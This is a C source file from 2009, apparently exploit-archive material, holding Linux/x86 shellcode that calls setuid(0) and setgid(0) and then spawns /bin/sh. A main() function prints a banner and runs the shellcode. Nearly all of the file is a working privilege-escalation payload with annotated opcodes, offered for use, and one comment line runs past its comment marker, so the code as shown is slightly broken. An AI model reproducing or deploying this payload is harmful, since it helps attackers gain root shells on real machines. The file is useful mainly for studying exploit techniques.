#include <stdio.h>

const char shellcode[]=
	"\x6a\x17"		// push	$0x17
	"\x58"			// pop	%eax
	"\x31\xdb"		// xor	%ebx,%ebx
	"\xcd\x80"		// int	$0x80

	"\xb0\x2e"		// mov	$0x2e,%al
	"\xcd\x80"		// int	$0x80

	"\xb0\x0b"		// mov	$0xb,%al (So you'll get segfault if it's not able to
do the setuid(0). If you don't want this you can write "\x6a\x0b\x58"
instead of "\xb0\x0b", but the shellcode will be 1 byte longer
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x68\x2f\x2f\x73\x68"	// push	$0x68732f2f
	"\x68\x2f\x62\x69\x6e"	// push	$0x6e69622f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 setuid(0), setgid(0) &
execve(/bin/sh,[/bin/sh,NULL])"
		"\n[+] Date: 23/06/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}